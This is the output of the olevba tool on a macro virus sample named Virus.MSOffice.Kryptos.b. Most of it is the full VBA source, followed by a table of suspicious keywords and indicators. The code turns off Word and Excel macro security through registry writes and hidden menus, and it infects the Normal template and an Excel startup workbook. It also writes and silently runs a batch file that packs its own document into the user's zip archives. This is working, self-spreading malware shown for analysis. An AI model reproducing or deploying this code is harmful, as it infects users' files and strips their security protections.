olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Kryptos.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Kryptos.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
'se7en
On Error Resume Next
Options.SaveNormalPrompt = (5 - 5)
Options.ConfirmConversions = (4 - 4)
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security", "Level") = 1
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.VirusProtection = (59 - 59)
End If
Set mal = NormalTemplate.VBProject
Set nrmal = mal.VBComponents(1).codemodule
Set ak = ActiveDocument.VBProject
Set tiv = ak.VBComponents(1).codemodule
Options.SendMailAttach = (3 - 2)
If nrmal.Lines(2, 1) <> "'se7en" Then
nrmal.DeleteLines 1, nrmal.CountOfLines
nrmal.InsertLines 2, tiv.Lines(2, tiv.CountOfLines)
nrmal.InsertLines 1, "Sub Document_Open()"
nrmal.Replaceline 65, "Sub Workbook_Deactivate"
End If
If tiv.Lines(2, 1) <> "'se7en" Then
tiv.DeleteLines 1, tiv.CountOfLines
tiv.InsertLines 2, nrmal.Lines(2, nrmal.CountOfLines)
tiv.InsertLines 1, "Sub Document_Close()"
tiv.Replaceline 65, "Sub Workbook_Activate()"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
Set xlApp = CreateObject("Excel.Application")
If UCase(Dir(xlApp.Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
Set Book1Obj = xlApp.Workbooks.Add
Book1Obj.VBProject.VBComponents.Item("ThisWorkbook").codemodule.InsertLines 1, nrmal.Lines(1, nrmal.CountOfLines)
Book1Obj.VBProject.VBComponents.Item("ThisWorkbook").codemodule.Replaceline 65, "Sub Workbook_Deactivate()"
Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
Book1Obj.Close
xlApp.Quit
Open "C:\Windows\Default.html" For Output As 1
Print #1, "<html><head><title>se7en</title></head><body><center><h1>Se7eN</h1> "
Print #1, "All love<br>Slowly fades<br>While we refuse change<br>All things<br>Come and go"
Print #1, "<br>This we know<br>This we know<br>You can find a reason<br>For anything<br>And you can make excuses<br>"
Print #1, "For all bad things<br>And you can justify<br>Before present occurs<br>So you can walk away<br>Before I begin to hurt<br>"
Print #1, "Can't you see that i still believe<br>That as long as you dream<br>Some things will always be<br>So please don't poison me<br>"
Print #1, "Please don't poison me<br>With your bitterness<br>You look<br>But you see right through me<br>Like I don't exist<br>"
Print #1, "I don't exist<br>But I point<br>"
Print #1, "And say you are a liar<br>"
Print #1, "You are a liar"
Print #1, "<br>Someday<br>"
Print #1, "<br><br><br>Someday</html>"
Close 1
Open "c:\Windows\Zipem.bat" For Output As 1
Print #1, "Set wz=""c:\Program Files\WinZip\WinZip32.exe"""
Print #1, "for %%a in ('*.zip ..\*.zip Windows\Desktop\*.zip ') do %wz% -a -r -p %%a c:\readme.rtf"
Close #1
ActiveDocument.SaveAs FileName:="c:\readme.rtf", FileFormat:=wdFormatDocument
Shell "c:\windows\zipem.bat", vbHide


End If
End Sub
   
Sub Workbook_Activate()
On Error Resume Next
Set a = ActiveWorkbook.VBProject
Set aw = a.VBComponents("ThisWorkbook").codemodule
Set t = ThisWorkbook.VBProject
Set tw = t.VBComponents("ThisWorkbook").codemodule
tw.Replaceline 65, "Sub Workbook_Deactivate"
If aw.Lines(2, 1) <> "'se7en" Then
aw.DeleteLines 1, aw.CountOfLines
aw.InsertLines 1, tw.Lines(1, tw.CountOfLines)
End If
If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
ActiveWorkbook.SaveAs Excel.Application.StartupPath & "\Book1."
Open "c:\se7en.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
Print #1, """Level""=dword:00000001"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
Print #1, """Level""=dword:00000001"
Close 1
Shell "regedit /s c:\se7en.reg", vbHide
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
crossQuit = True
End If
Set nr = WordObj.NormalTemplate
Set nrmal = nr.VBProject.VBComponents(1).codemodule
WordObj.Options.SaveNormalPrompt = (350 - 350)
nrmal.DeleteLines 1, nrmal.CountOfLines
nrmal.InsertLines 1, tw.Lines(1, tw.CountOfLines)
nrmal.Replaceline 1, "Sub Document_Open"
nrmal.Save
If crossQuit = True Then WordObj.Quit
End If

End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Workbook_Activate   |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Zipem.bat           |Executable file name                         |
|IOC       |WinZip32.exe        |Executable file name                         |
|IOC       |zipem.bat           |Executable file name                         |
|IOC       |se7en.reg           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

